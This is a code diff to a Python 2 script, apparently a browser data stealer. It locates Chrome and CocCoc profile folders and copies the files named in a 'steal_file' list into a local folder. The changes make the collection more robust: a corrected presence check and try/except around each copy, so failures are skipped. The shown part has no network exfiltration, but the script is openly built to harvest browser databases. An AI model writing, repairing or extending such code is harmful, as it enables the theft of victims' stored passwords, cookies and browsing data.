@@ -25,9 +25,9 @@ def get_dbs():
 			dbs['chrome'] = path + '\Google\Chrome\User Data\Default\\'
 		if 'CocCoc' in i[1]:
 			dbs['coccoc'] = path + '\CocCoc\Browser\User Data\Default\\'
-	if 'chrome' and 'coccoc' not in dbs:
+	if ('chrome' not in dbs) and ('coccoc' not in dbs):
 		print '> Exit'
-		quit(0)
+		sys.exit()
 
 	# Create folder
 	try:		
@@ -40,14 +40,20 @@ def get_dbs():
 	if 'chrome' in dbs:
 		sys.stdout.write('> Chrome: ')
 		for file in steal_file:
-			sys.stdout.write('! ')
-			shutil.copy(dbs['chrome']+file, '.\\' + folder + '\\' + file + '_chrome')
+			try:
+				sys.stdout.write('! ')
+				shutil.copy(dbs['chrome']+file, '.\\' + folder + '\\' + file + '_chrome')
+			except:
+				sys.stdout.write('. ')
 		sys.stdout.write(' OK, copied.\n')
 	if 'coccoc' in dbs:
 		sys.stdout.write('> CocCoc: ')
 		for file in steal_file:
-			sys.stdout.write('! ')
-			shutil.copy(dbs['coccoc']+file, '.\\' + folder + '\\' + file + '_coccoc')
+			try:
+				sys.stdout.write('! ')
+				shutil.copy(dbs['coccoc']+file, '.\\' + folder + '\\' + file + '_coccoc')
+			except:
+				sys.stdout.write('. ')
 		sys.stdout.write(' OK, copied.\n')
 
 def connect2dbs():
